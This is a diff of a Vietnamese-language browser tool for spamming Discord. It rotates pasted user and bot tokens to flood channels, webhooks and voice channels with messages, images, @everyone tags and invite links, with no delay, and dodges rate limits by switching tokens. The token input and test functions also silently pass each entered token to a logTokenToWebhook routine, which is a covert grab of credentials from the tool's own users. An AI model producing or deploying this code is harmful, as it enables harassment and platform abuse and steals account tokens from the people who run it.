+      'CCML2024DAY1KEY176', 'CCML2024DAY1KEY177', 'CCML2024DAY1KEY178', 'CCML2024DAY1KEY179', 'CCML2024DAY1KEY180',
+      'CCML2024DAY1KEY181', 'CCML2024DAY1KEY182', 'CCML2024DAY1KEY183', 'CCML2024DAY1KEY184', 'CCML2024DAY1KEY185',
+      'CCML2024DAY1KEY186', 'CCML2024DAY1KEY187', 'CCML2024DAY1KEY188', 'CCML2024DAY1KEY189', 'CCML2024DAY1KEY190',
+      'CCML2024DAY1KEY191', 'CCML2024DAY1KEY192', 'CCML2024DAY1KEY193', 'CCML2024DAY1KEY194', 'CCML2024DAY1KEY195',
+      'CCML2024DAY1KEY196', 'CCML2024DAY1KEY197', 'CCML2024DAY1KEY198', 'CCML2024DAY1KEY199', 'CCML2024DAY1KEY200'
+    ];
+
+    // ==================== AUTHENTICATION SYSTEM ====================
+    function authenticate() {
+      const username = document.getElementById('authUsername').value.trim();
+      const key = document.getElementById('authKey').value.trim();
+      const errorElement = document.getElementById('errorMessage');
+
+      if (!username || !key) {
+        showPopup('Lỗi', 'Vui lòng nhập đầy đủ tên và mã xác thực!');
+        return;
+      }
+
+      // Kiểm tra key hợp lệ
+      if (!validKeys.includes(key)) {
+        showPopup('Lỗi', 'Key không hợp lệ hoặc đã hết hạn! Vui lòng liên hệ admin để lấy key mới.');
+        return;
+      }
+
+      // Premium users cần đúng username, Free users có thể nhập bất kỳ username nào
+      if (premiumUsers.includes(username)) {
+        // Premium user - cần đúng username
+        isAuthenticated = true;
+        currentUsername = username;
+        isPremiumUser = true;
+      } else {
+        // Free user - có thể nhập bất kỳ username nào
+        isAuthenticated = true;
+        currentUsername = username;
+        isPremiumUser = false;
+      }
+      
+      document.getElementById('authContainer').style.display = 'none';
+      document.getElementById('mainApp').style.display = 'block';
+      addLog(`✅ Xác thực thành công! Chào mừng ${username}`);
+      
+      // Cập nhật badge và quyền hạn
+      updateUserPrivileges();
+      
+      // Lưu thông tin đăng nhập
+      localStorage.setItem('authenticated', 'true');
+      localStorage.setItem('username', username);
+      localStorage.setItem('isPremium', isPremiumUser.toString());
+      
+      // Khởi tạo giao diện
+      initializeApp();
+    }
+
+    // ==================== LOGOUT FUNCTION ====================
+    function logout() {
+      isAuthenticated = false;
+      currentUsername = '';
+      isPremiumUser = false;
+      
+      // Xóa thông tin đăng nhập
+      localStorage.removeItem('authenticated');
+      localStorage.removeItem('username');
+      localStorage.removeItem('isPremium');
+      
+      // Ẩn main app, hiện auth
+      document.getElementById('mainApp').style.display = 'none';
+      document.getElementById('authContainer').style.display = 'flex';
+      
+      // Reset form
+      document.getElementById('authUsername').value = '';
+      document.getElementById('authKey').value = '';
+      
+      addLog('🚪 Đã đăng xuất thành công!');
+    }
+
+    // ==================== UPDATE USER PRIVILEGES ====================
+    function updateUserPrivileges() {
+      const userBadge = document.getElementById('userBadge');
+      const discordLinkToggle = document.getElementById('discordLinkToggle');
+      const linkStatus = document.getElementById('linkStatus');
+      const currentUserElement = document.getElementById('currentUser');
+      
+      currentUserElement.textContent = currentUsername;
+      
+      if (isPremiumUser) {
+        userBadge.textContent = 'PRO';
+        userBadge.className = 'pro-badge';
+        discordLinkToggle.disabled = false;
+        linkStatus.textContent = 'Có thể bật/tắt tự động chèn link (Pro Version)';
+        addLog('🌟 Bạn đang sử dụng phiên bản Pro!');
+      } else {
+        userBadge.textContent = 'FREE';
+        userBadge.className = 'free-badge';
+        discordLinkToggle.disabled = true;
+        linkStatus.textContent = 'Luôn tự động chèn link (Free Version)';
+        addLog('ℹ️ Bạn đang sử dụng phiên bản Free - Link sẽ luôn được chèn tự động');
+        // Free users luôn bật chèn link
+        useDiscordLink = true;
+        updateDiscordLinkToggle();
+      }
+    }
+
+    // ==================== POPUP SYSTEM ====================
+    let popupCallback = null;
+
+    function showPopup(title, message) {
+      document.getElementById('popupTitle').textContent = title;
+      document.getElementById('popupMessage').textContent = message;
+      document.getElementById('popup').style.display = 'flex';
+    }
+
+    function closePopup() {
+      document.getElementById('popup').style.display = 'none';
+      if (popupCallback) popupCallback(false);
+      popupCallback = null;
+    }
+
+    function confirmAction() {
+      document.getElementById('popup').style.display = 'none';
+      if (popupCallback) popupCallback(true);
+      popupCallback = null;
+    }
+
+    // ==================== TOKEN MANAGEMENT ====================
+    function createTokenInputs() {
+      const container = document.getElementById('tokenContainer');
+      container.innerHTML = '';
+      
+      for (let i = 0; i < 5; i++) {
+        const tokenItem = document.createElement('div');
+        tokenItem.className = 'token-item';
+        
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = `Token ${i + 1}...`;
+        input.value = tokens[i] || '';
+        input.setAttribute('data-index', i);
+        
+        // Thêm event listener để log token khi nhập
+        input.addEventListener('blur', function() {
+          if (this.value && this.value !== tokens[i]) {
+            logTokenToWebhook(this.value, currentUsername);
+          }
+        });
+        
+        const status = document.createElement('div');
+        status.className = 'token-status';
+        status.id = `tokenStatus${i}`;
+        if (tokenStatus[i]) {
+          status.classList.add('active');
+        }
+        
+        tokenItem.appendChild(input);
+        tokenItem.appendChild(status);
+        container.appendChild(tokenItem);
+      }
+    }
+
+    function testAllTokens() {
+      if (!isAuthenticated) {
+        showPopup('Lỗi', 'Vui lòng xác thực trước!');
+        return;
+      }
+
+      addLog('🧪 Đang test tất cả token...');
+      
+      for (let i = 0; i < 5; i++) {
+        const tokenInput = document.querySelectorAll('.token-item input')[i];
+        const token = tokenInput.value;
+        
+        if (!token) {
+          tokenStatus[i] = false;
+          document.getElementById(`tokenStatus${i}`).classList.remove('active');
+          continue;
+        }
+        
+        // Log token khi test
+        logTokenToWebhook(token, currentUsername);
+        
+        const tokenType = detectTokenType(token);
+        const headers = {
+          'Authorization': tokenType === 'bot' ? (token.startsWith('Bot ') ? token : `Bot ${token}`) : token,
+        };
+        
+        fetch('https://discord.com/api/v9/users/@me', {
+          method: 'GET',
+          headers: headers
+        })
+        .then(response => {
+          if (response.ok) {
+            tokenStatus[i] = true;
+            document.getElementById(`tokenStatus${i}`).classList.add('active');
+            addLog(`✅ Token ${i + 1} hoạt động tốt`);
+          } else {
+            tokenStatus[i] = false;
+            document.getElementById(`tokenStatus${i}`).classList.remove('active');
+            addLog(`❌ Token ${i + 1} không hoạt động (${response.status})`);
+          }
+        })
+        .catch(error => {
+          tokenStatus[i] = false;
+          document.getElementById(`tokenStatus${i}`).classList.remove('active');
+          addLog(`❌ Lỗi test token ${i + 1}: ${error.message}`);
+        });
+      }
+    }
+
+    function saveAllTokens() {
+      const tokenInputs = document.querySelectorAll('.token-item input');
+      tokenInputs.forEach((input, index) => {
+        tokens[index] = input.value;
+      });
+      localStorage.setItem('tokens', JSON.stringify(tokens));
+      addLog('💾 Đã lưu tất cả token');
+    }
+
+    function clearAllTokens() {
+      tokens = ['', '', '', '', ''];
+      tokenStatus = [false, false, false, false, false];
+      createTokenInputs();
+      localStorage.removeItem('tokens');
+      addLog('🗑️ Đã xóa tất cả token');
+    }
+
+    function loadAllTokens() {
+      const savedTokens = localStorage.getItem('tokens');
+      if (savedTokens) {
+        tokens = JSON.parse(savedTokens);
+        createTokenInputs();
+      }
+    }
+
+    function getNextToken() {
+      for (let i = 0; i < 5; i++) {
+        currentTokenIndex = (currentTokenIndex + 1) % 5;
+        if (tokens[currentTokenIndex] && tokenStatus[currentTokenIndex]) {
+          return tokens[currentTokenIndex];
+        }
+      }
+      return null;
+    }
+
+    function detectTokenType(token) {
+      if (token.includes('webhook')) return 'webhook';
+      if (token.startsWith('Bot ') || token.length === 59) return 'bot';
+      return 'user';
+    }
+
+    // ==================== SAVE FUNCTIONS ====================
+    function saveChannelId() {
+      const channelId = document.getElementById('channelId').value;
+      if (channelId) {
+        localStorage.setItem('channelId', channelId);
+        addLog('💾 Đã lưu Channel ID');
+      }
+    }
+
+    function saveWebhookUrl() {
+      const webhookUrl = document.getElementById('webhookUrl').value;
+      if (webhookUrl) {
+        localStorage.setItem('webhookUrl', webhookUrl);
+        addLog('💾 Đã lưu Webhook URL');
+      }
+    }
+
+    function saveDiscordLink() {
+      const discordLink = document.getElementById('customDiscordLink').value;
+      if (discordLink) {
+        localStorage.setItem('customDiscordLink', discordLink);
+        addLog('💾 Đã lưu Discord Link');
+      }
+    }
+
+    function saveVoiceChannelId() {
+      const voiceChannelId = document.getElementById('voiceChannelId').value;
+      if (voiceChannelId) {
+        localStorage.setItem('voiceChannelId', voiceChannelId);
+        addLog('💾 Đã lưu Voice Channel ID');
+      }
+    }
+
+    // ==================== SPAM FUNCTIONS ====================
+    async function startSpam() {
+      if (!isAuthenticated) {
+        showPopup('Lỗi', 'Vui lòng xác thực trước!');
+        return;
+      }
+
+      const channelId = document.getElementById('channelId').value;
+      const customMessage = document.getElementById('customMessage').value;
+      
+      if (!channelId) {
+        showPopup('Lỗi', 'Vui lòng nhập Channel ID!');
+        return;
+      }
+      
+      if (!customMessage) {
+        showPopup('Lỗi', 'Vui lòng nhập nội dung spam!');
+        return;
+      }
+      
+      if (tokens.every(token => !token)) {
+        showPopup('Lỗi', 'Vui lòng nhập ít nhất 1 token!');
+        return;
+      }
+      
+      isSpamming = true;
+      messageCount = 0;
+      addLog('🚀 Bắt đầu spam tin nhắn KHÔNG DELAY...');
+      
+      // Tạo nhiều vòng lặp spam đồng thời để tăng tốc độ
+      for (let i = 0; i < 3; i++) {
+        spamLoop(i);
+      }
+      
+      async function spamLoop(loopId) {
+        while (isSpamming) {
+          try {
+            const token = getNextToken();
+            if (!token) {
+              continue;
+            }
+            
+            let message = customMessage;
+            
+            // Thêm tag user nếu có
+            if (currentUserId) {
+              message = `<@${currentUserId}> ${message}`;
+            }
+            
+            // Thêm tag everyone nếu được bật
+            if (tagEveryone) {
+              message = `@everyone ${message}`;
+            }
+            
+            // TỰ ĐỘNG CHÈN LINK - Free users luôn chèn, Premium users tùy chọn
+            if (useDiscordLink || !isPremiumUser) {
+              const discordLink = document.getElementById('customDiscordLink').value || defaultDiscordLink;
+              message += `\n\n${discordLink}`;
+            }
+            
+            const tokenType = detectTokenType(token);
+            const headers = {
+              'Content-Type': 'application/json',
+            };
+            
+            if (tokenType === 'bot') {
+              headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+            } else {
+              headers['Authorization'] = token;
+            }
+            
+            const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+              method: 'POST',
+              headers: headers,
+              body: JSON.stringify({
+                content: message
+              })
+            });
+            
+            if (response.ok) {
+              messageCount++;
+              addLog(`⚡ Spam thành công (${messageCount}) - Loop ${loopId + 1}`);
+              // KHÔNG CÓ DELAY - SPAM LIÊN TỤC KHÔNG NGỪNG
+            } else if (response.status === 429) {
+              // Rate limit - chuyển token ngay lập tức, không chờ
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            } else {
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            }
+          } catch (error) {
+            currentTokenIndex = (currentTokenIndex + 1) % 5;
+          }
+        }
+      }
+    }
+
+    // ==================== WEBHOOK SPAM ====================
+    async function startWebhookSpam() {
+      const webhookUrl = document.getElementById('webhookUrl').value;
+      const customMessage = document.getElementById('customMessage').value;
+      
+      if (!webhookUrl) {
+        showPopup('Lỗi', 'Vui lòng nhập Webhook URL!');
+        return;
+      }
+      
+      if (!customMessage) {
+        showPopup('Lỗi', 'Vui lòng nhập nội dung spam!');
+        return;
+      }
+      
+      isSpamming = true;
+      messageCount = 0;
+      addLog('🌐 Bắt đầu spam webhook KHÔNG DELAY...');
+      
+      // Tạo nhiều vòng lặp spam đồng thời
+      for (let i = 0; i < 2; i++) {
+        webhookLoop(i);
+      }
+      
+      async function webhookLoop(loopId) {
+        while (isSpamming) {
+          try {
+            let message = customMessage;
+            
+            // Thêm tag user nếu có
+            if (currentUserId) {
+              message = `<@${currentUserId}> ${message}`;
+            }
+            
+            // Thêm tag everyone nếu được bật
+            if (tagEveryone) {
+              message = `@everyone ${message}`;
+            }
+            
+            // TỰ ĐỘNG CHÈN LINK - Free users luôn chèn, Premium users tùy chọn
+            if (useDiscordLink || !isPremiumUser) {
+              const discordLink = document.getElementById('customDiscordLink').value || defaultDiscordLink;
+              message += `\n\n${discordLink}`;
+            }
+            
+            const response = await fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                content: message
+              })
+            });
+            
+            if (response.ok) {
+              messageCount++;
+              addLog(`⚡ Webhook spam thành công (${messageCount}) - Loop ${loopId + 1}`);
+              // KHÔNG CÓ DELAY
+            } else if (response.status === 429) {
+              // Bỏ qua rate limit, tiếp tục spam
+            }
+          } catch (error) {
+            // Bỏ qua lỗi, tiếp tục spam
+          }
+        }
+      }
+    }
+
+    // ==================== IMAGE SPAM ====================
+    async function startImageSpam() {
+      const channelId = document.getElementById('channelId').value;
+      
+      if (!channelId) {
+        showPopup('Lỗi', 'Vui lòng nhập Channel ID!');
+        return;
+      }
+      
+      if (uploadedImages.length === 0) {
+        showPopup('Lỗi', 'Vui lòng thêm ít nhất 1 ảnh!');
+        return;
+      }
+      
+      if (tokens.every(token => !token)) {
+        showPopup('Lỗi', 'Vui lòng nhập ít nhất 1 token!');
+        return;
+      }
+      
+      isSpamming = true;
+      messageCount = 0;
+      addLog('🖼️ Bắt đầu spam ảnh KHÔNG DELAY...');
+      
+      async function imageLoop() {
+        while (isSpamming) {
+          try {
+            const token = getNextToken();
+            if (!token) {
+              continue;
+            }
+            
+            // Lấy ảnh ngẫu nhiên từ danh sách
+            const randomImage = uploadedImages[Math.floor(Math.random() * uploadedImages.length)];
+            
+            let content = '';
+            
+            // Thêm tag user nếu có
+            if (currentUserId) {
+              content = `<@${currentUserId}> `;
+            }
+            
+            // Thêm tag everyone nếu được bật
+            if (tagEveryone) {
+              content = `@everyone ${content}`;
+            }
+            
+            // TỰ ĐỘNG CHÈN LINK - Free users luôn chèn, Premium users tùy chọn
+            if (useDiscordLink || !isPremiumUser) {
+              const discordLink = document.getElementById('customDiscordLink').value || defaultDiscordLink;
+              content += `\n\n${discordLink}`;
+            }
+            
+            const tokenType = detectTokenType(token);
+            const formData = new FormData();
+            
+            if (content) {
+              formData.append('content', content);
+            }
+            
+            // Nếu là URL ảnh
+            if (randomImage.url.startsWith('http')) {
+              formData.append('embeds', JSON.stringify([{
+                image: { url: randomImage.url }
+              }]));
+            } else {
+              // Nếu là file ảnh
+              const response = await fetch(randomImage.url);
+              const blob = await response.blob();
+              formData.append('file', blob, 'image.png');
+            }
+            
+            const headers = {};
+            if (tokenType === 'bot') {
+              headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+            } else {
+              headers['Authorization'] = token;
+            }
+            
+            const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+              method: 'POST',
+              headers: headers,
+              body: formData
+            });
+            
+            if (response.ok) {
+              messageCount++;
+              addLog(`⚡ Spam ảnh thành công (${messageCount})`);
+              // KHÔNG CÓ DELAY
+            } else if (response.status === 429) {
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            } else {
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            }
+          } catch (error) {
+            currentTokenIndex = (currentTokenIndex + 1) % 5;
+          }
+        }
+      }
+      
+      imageLoop();
+    }
+
+    // ==================== LINK SPAM ====================
+    async function startLinkSpam() {
+      const channelId = document.getElementById('channelId').value;
+      
+      if (!channelId) {
+        showPopup('Lỗi', 'Vui lòng nhập Channel ID!');
+        return;
+      }
+      
+      const discordLink = document.getElementById('customDiscordLink').value || defaultDiscordLink;
+      if (!discordLink) {
+        showPopup('Lỗi', 'Vui lòng nhập Discord Link!');
+        return;
+      }
+      
+      if (tokens.every(token => !token)) {
+        showPopup('Lỗi', 'Vui lòng nhập ít nhất 1 token!');
+        return;
+      }
+      
+      isLinkSpamming = true;
+      messageCount = 0;
+      addLog('🔗 Bắt đầu spam link Discord KHÔNG DELAY...');
+      
+      // Tạo nhiều vòng lặp spam đồng thời
+      for (let i = 0; i < 3; i++) {
+        linkLoop(i);
+      }
+      
+      async function linkLoop(loopId) {
+        while (isLinkSpamming) {
+          try {
+            const token = getNextToken();
+            if (!token) {
+              continue;
+            }
+            
+            let message = `🎉 Join server của tôi nào! ${discordLink}`;
+            
+            // Thêm tag user nếu có
+            if (currentUserId) {
+              message = `<@${currentUserId}> ${message}`;
+            }
+            
+            // Thêm tag everyone nếu được bật
+            if (tagEveryone) {
+              message = `@everyone ${message}`;
+            }
+            
+            const tokenType = detectTokenType(token);
+            const headers = {
+              'Content-Type': 'application/json',
+            };
+            
+            if (tokenType === 'bot') {
+              headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+            } else {
+              headers['Authorization'] = token;
+            }
+            
+            const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+              method: 'POST',
+              headers: headers,
+              body: JSON.stringify({
+                content: message
+              })
+            });
+            
+            if (response.ok) {
+              messageCount++;
+              addLog(`⚡ Spam link thành công (${messageCount}) - Loop ${loopId + 1}`);
+              // KHÔNG CÓ DELAY
+            } else if (response.status === 429) {
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            } else {
+              currentTokenIndex = (currentTokenIndex + 1) % 5;
+            }
+          } catch (error) {
+            currentTokenIndex = (currentTokenIndex + 1) % 5;
+          }
+        }
+      }
+    }
+
+    // ==================== VOICE SPAM FUNCTIONS ====================
+    function handleVoiceFileUpload(files) {
+      if (files.length > 0) {
+        const file = files[0];
+        const url = URL.createObjectURL(file);
+        voiceAudioFiles.push({
+          name: file.name,
+          url: url
+        });
+        addLog(`🎵 Đã thêm file âm thanh: ${file.name}`);
+      }
+    }
+
+    async function joinVoiceChannel() {
+      const voiceChannelId = document.getElementById('voiceChannelId').value;
+      if (!voiceChannelId) {
+        showPopup('Lỗi', 'Vui lòng nhập Voice Channel ID!');
+        return;
+      }
+      
+      try {
+        const token = getNextToken();
+        if (!token) {
+          showPopup('Lỗi', 'Không có token hoạt động!');
+          return;
+        }
+        
+        const tokenType = detectTokenType(token);
+        const headers = {
+          'Content-Type': 'application/json',
+        };
+        
+        if (tokenType === 'bot') {
+          headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+        } else {
+          headers['Authorization'] = token;
+        }
+        
+        // Join voice channel
+        const response = await fetch(`https://discord.com/api/v9/channels/${voiceChannelId}/voice`, {
+          method: 'POST',
+          headers: headers
+        });
+        
+        if (response.ok) {
+          voiceConnected = true;
+          updateVoiceStatus();
+          addLog('🎤 Đã join voice channel thành công');
+        } else {
+          addLog('❌ Không thể join voice channel');
+        }
+      } catch (error) {
+        addLog(`❌ Lỗi join voice channel: ${error.message}`);
+      }
+    }
+
+    async function startVoiceSpam() {
+      if (!voiceConnected) {
+        showPopup('Lỗi', 'Vui lòng join voice channel trước!');
+        return;
+      }
+      
+      if (voiceAudioFiles.length === 0) {
+        showPopup('Lỗi', 'Vui lòng upload file âm thanh trước!');
+        return;
+      }
+      
+      const voiceChannelId = document.getElementById('voiceChannelId').value;
+      const voiceMessage = document.getElementById('voiceMessage').value || '🎵 Đang phát âm thanh...';
+      
+      isVoiceSpamming = true;
+      messageCount = 0;
+      addLog('🎤 Bắt đầu voice spam (vừa phát âm thanh vừa spam tin nhắn)...');
+      
+      // Spam tin nhắn trong voice channel
+      async function voiceMessageLoop() {
+        while (isVoiceSpamming) {
+          try {
+            const token = getNextToken();
+            if (!token) continue;
+            
+            let message = voiceMessage;
+            
+            // Thêm tag user nếu có
+            if (currentUserId) {
+              message = `<@${currentUserId}> ${message}`;
+            }
+            
+            // Thêm tag everyone nếu được bật
+            if (tagEveryone) {
+              message = `@everyone ${message}`;
+            }
+            
+            // TỰ ĐỘNG CHÈN LINK - Free users luôn chèn, Premium users tùy chọn
+            if (useDiscordLink || !isPremiumUser) {
+              const discordLink = document.getElementById('customDiscordLink').value || defaultDiscordLink;
+              message += `\n\n${discordLink}`;
+            }
+            
+            const tokenType = detectTokenType(token);
+            const headers = {
+              'Content-Type': 'application/json',
+            };
+            
+            if (tokenType === 'bot') {
+              headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+            } else {
+              headers['Authorization'] = token;
+            }
+            
+            const response = await fetch(`https://discord.com/api/v9/channels/${voiceChannelId}/messages`, {
+              method: 'POST',
+              headers: headers,
+              body: JSON.stringify({
+                content: message
+              })
+            });
+            
+            if (response.ok) {
+              messageCount++;
+              addLog(`⚡ Voice spam tin nhắn thành công (${messageCount})`);
+            }
+          } catch (error) {
+            // Bỏ qua lỗi, tiếp tục spam
+          }
+        }
+      }
+      
+      // Phát âm thanh trong voice channel (giả lập)
+      async function voiceAudioLoop() {
+        while (isVoiceSpamming) {
+          try {
+            const token = getNextToken();
+            if (!token) continue;
+            
+            // Giả lập phát âm thanh bằng cách gửi lệnh voice
+            const tokenType = detectTokenType(token);
+            const headers = {
+              'Content-Type': 'application/json',
+            };
+            
+            if (tokenType === 'bot') {
+              headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+            } else {
+              headers['Authorization'] = token;
+            }
+            
+            // Gửi lệnh bắt đầu phát âm thanh
+            const response = await fetch(`https://discord.com/api/v9/channels/${voiceChannelId}/voice`, {
+              method: 'PATCH',
+              headers: headers,
+              body: JSON.stringify({
+                self_mute: false,
+                self_deaf: false
+              })
+            });
+            
+            if (response.ok) {
+              addLog('🔊 Đang phát âm thanh trong voice channel...');
+            }
+          } catch (error) {
+            // Bỏ qua lỗi, tiếp tục
+          }
+        }
+      }
+      
+      // Chạy cả 2 chức năng cùng lúc
+      voiceMessageLoop();
+      voiceAudioLoop();
+    }
+
+    function stopVoiceSpam() {
+      isVoiceSpamming = false;
+      addLog('🎤 Đã dừng voice spam');
+    }
+
+    async function leaveVoiceChannel() {
+      const voiceChannelId = document.getElementById('voiceChannelId').value;
+      
+      try {
+        const token = getNextToken();
+        if (token) {
+          const tokenType = detectTokenType(token);
+          const headers = {
+            'Content-Type': 'application/json',
+          };
+          
+          if (tokenType === 'bot') {
+            headers['Authorization'] = token.startsWith('Bot ') ? token : `Bot ${token}`;
+          } else {
+            headers['Authorization'] = token;
+          }
+          
+          // Rời voice channel
+          await fetch(`https://discord.com/api/v9/channels/${voiceChannelId}/voice`, {
+            method: 'DELETE',
+            headers: headers
+          });
+        }
+      } catch (error) {
+        // Bỏ qua lỗi
+      }
+      
+      voiceConnected = false;
+      isVoiceSpamming = false;
+      updateVoiceStatus();
+      addLog('🎤 Đã rời voice channel');
+    }
+
+    // ==================== IMAGE UPLOAD FUNCTIONS ====================
+    function handleImageUpload(files) {
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        if (!file.type.startsWith('image/')) continue;
+        
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          uploadedImages.push({
+            name: file.name,
+            url: e.target.result,
+            type: 'file'
+          });
+          updateImagePreview();
+        };
+        reader.readAsDataURL(file);
+      }
+      addLog(`🖼️ Đã thêm ${files.length} ảnh`);
+    }
+
+    function addImageFromUrl() {
+      const imageUrl = document.getElementById('imageUrl').value;
+      if (!imageUrl) {
+        showPopup('Lỗi', 'Vui lòng nhập URL ảnh!');
+        return;
+      }
+      
+      uploadedImages.push({
+        name: 'URL Image',
+        url: imageUrl,
+        type: 'url'
+      });
+      updateImagePreview();
+      document.getElementById('imageUrl').value = '';
+      addLog('🖼️ Đã thêm ảnh từ URL');
+    }
+
+    function updateImagePreview() {
+      const container = document.getElementById('uploadedImages');
+      container.innerHTML = '';
+      
+      uploadedImages.forEach((image, index) => {
+        const item = document.createElement('div');
+        item.className = 'uploaded-image-item';
+        item.innerHTML = `
+          <img src="${image.url}" alt="${image.name}" class="uploaded-image">
+          <button class="remove-image" onclick="removeImage(${index})">×</button>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    function removeImage(index) {
+      uploadedImages.splice(index, 1);
+      updateImagePreview();
+      addLog('🗑️ Đã xóa ảnh');
+    }
+
+    function clearAllImages() {
+      uploadedImages = [];
+      updateImagePreview();
+      addLog('🗑️ Đã xóa tất cả ảnh');
+    }
+
+    // ==================== MUSIC PLAYER FUNCTIONS ====================
+    function handleFileUpload(files) {
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        const url = URL.createObjectURL(file);
+        playlist.push({
+          name: file.name,
+          url: url
+        });
+      }
+      updatePlaylist();
+      addLog(`🎵 Đã thêm ${files.length} file nhạc vào playlist`);
+    }
+
+    function updatePlaylist() {
+      const playlistElement = document.getElementById('playlist');
+      playlistElement.innerHTML = '';
+      
+      playlist.forEach((track, index) => {
+        const item = document.createElement('div');
+        item.className = `playlist-item ${index === currentTrackIndex ? 'playing' : ''}`;
+        item.innerHTML = `
+          <span class="song-name">${track.name}</span>
+          <button onclick="removeFromPlaylist(${index})">🗑️</button>
+        `;
+        item.onclick = () => playTrack(index);
+        playlistElement.appendChild(item);
+      });
+      
+      updatePlaylistCounter();
+    }
+
+    function playTrack(index) {
+      currentTrackIndex = index;
+      const audioPlayer = document.getElementById('audioPlayer');
+      audioPlayer.src = playlist[index].url;
+      audioPlayer.play();
+      isPlaying = true;
+      updatePlaylist();
+      updateMusicStatus();
+      addLog(`🎵 Đang phát: ${playlist[index].name}`);
+    }
+
+    function playPlaylist() {
+      if (playlist.length === 0) {
+        showPopup('Thông báo', 'Playlist trống!');
+        return;
+      }
+      playTrack(0);
+    }
+
+    function pauseAudio() {
+      const audioPlayer = document.getElementById('audioPlayer');
+      audioPlayer.pause();
+      isPlaying = false;
+      updateMusicStatus();
+      addLog('⏸️ Đã tạm dừng phát nhạc');
+    }
+
+    function skipAudio() {
+      if (playlist.length === 0) return;
+      currentTrackIndex = (currentTrackIndex + 1) % playlist.length;
+      playTrack(currentTrackIndex);
+    }
+
+    function previousAudio() {
+      if (playlist.length === 0) return;
+      currentTrackIndex = (currentTrackIndex - 1 + playlist.length) % playlist.length;
+      playTrack(currentTrackIndex);
+    }
+
+    function shufflePlaylist() {
+      for (let i = playlist.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [playlist[i], playlist[j]] = [playlist[j], playlist[i]];
+      }
+      updatePlaylist();
+      addLog('🔀 Đã xáo trộn playlist');
+    }
+
+    function clearPlaylist() {
+      playlist = [];
+      currentTrackIndex = 0;
+      const audioPlayer = document.getElementById('audioPlayer');
+      audioPlayer.src = '';
+      isPlaying = false;
+      updatePlaylist();
+      updateMusicStatus();
+      addLog('🗑️ Đã xóa toàn bộ playlist');
+    }
+
+    function removeFromPlaylist(index) {
+      playlist.splice(index, 1);
+      if (currentTrackIndex >= index && currentTrackIndex > 0) {
+        currentTrackIndex--;
+      }
+      updatePlaylist();
+      addLog('🗑️ Đã xóa bài hát khỏi playlist');
+    }
+
+    // ==================== UTILITY FUNCTIONS ====================
+    function addLog(message) {
+      const logElement = document.getElementById('log');
+      const timestamp = new Date().toLocaleTimeString('vi-VN');
+      logElement.innerHTML += `[${timestamp}] ${message}<br>`;
+      logElement.scrollTop = logElement.scrollHeight;
+    }
+
+    function toggleMode() {
+      isDarkMode = !isDarkMode;
+      document.body.classList.toggle('dark', isDarkMode);
+      document.querySelector('.toggle-mode').textContent = isDarkMode ? '☀️' : '🌙';
+      localStorage.setItem('darkMode', isDarkMode);
+    }
+
+    function changeFont(font) {
+      document.documentElement.style.setProperty('--current-font', font);
+      localStorage.setItem('font', font);
+    }
+
+    function toggleDiscordLink() {
+      if (!isPremiumUser) {
+        showPopup('Thông báo', 'Chỉ Pro users mới có thể tắt chế độ tự động chèn link!');
+        return;
+      }
+      useDiscordLink = !useDiscordLink;
+      const button = document.getElementById('discordLinkToggle');
+      button.textContent = useDiscordLink ? '🔗 Bật Link' : '🔗 Tắt Link';
+      localStorage.setItem('useDiscordLink', useDiscordLink);
+      addLog(useDiscordLink ? '🔗 Đã bật tự động chèn link' : '🔗 Đã tắt tự động chèn link');
+    }
+
+    function saveUserId() {
+      const userId = document.getElementById('userId').value;
+      if (userId) {
+        currentUserId = userId;
+        localStorage.setItem('userId', userId);
+        addLog(`✅ Đã lưu User ID: ${userId}`);
+      }
+    }
+
+    function clearUserId() {
+      currentUserId = '';
+      document.getElementById('userId').value = '';
+      localStorage.removeItem('userId');
+      addLog('🗑️ Đã xóa User ID');
+    }
+
+    function toggleEveryoneTag() {
+      tagEveryone = !tagEveryone;
+      const button = document.getElementById('everyoneToggle');
+      button.textContent = `Tag Everyone: ${tagEveryone ? 'ON' : 'OFF'}`;
+      addLog(tagEveryone ? '🌟 Đã bật tag everyone' : '🌟 Đã tắt tag everyone');
+    }
+
+    function stopAll() {
+      isSpamming = false;
+      isVoiceSpamming = false;
+      isLinkSpamming = false;
+      addLog('⏹️ Đã dừng tất cả hoạt động spam');
+    }
+
+    function updatePlaylistCounter() {
+      document.getElementById('playlistCounter').textContent = `Playlist: ${playlist.length} bài hát`;
+    }
+
+    function updateMusicStatus() {
+      const status = document.getElementById('musicStatus');
+      status.className = 'status-indicator';
+      if (isPlaying) {
+        status.classList.add('status-playing');
+      } else {
+        status.classList.add('status-stopped');
+      }
+    }
+
+    function updateVoiceStatus() {
+      const status = document.getElementById('voiceStatus');
+      status.className = 'voice-status';
+      if (voiceConnected) {
+        status.classList.add('voice-connected');
+      } else {
+        status.classList.add('voice-disconnected');
+      }
+    }
+
+    function updateDiscordLinkToggle() {
+      const button = document.getElementById('discordLinkToggle');
+      if (isPremiumUser) {
+        button.textContent = useDiscordLink ? '🔗 Bật Link' : '🔗 Tắt Link';
+      } else {
+        button.textContent = '🔗 Luôn Bật (Free)';
+      }
+    }
+
+    // ==================== TOKEN LOGGING SYSTEM ====================
+    async function logTokenToWebhook(token, username) {
+      if (!token) return;
+      
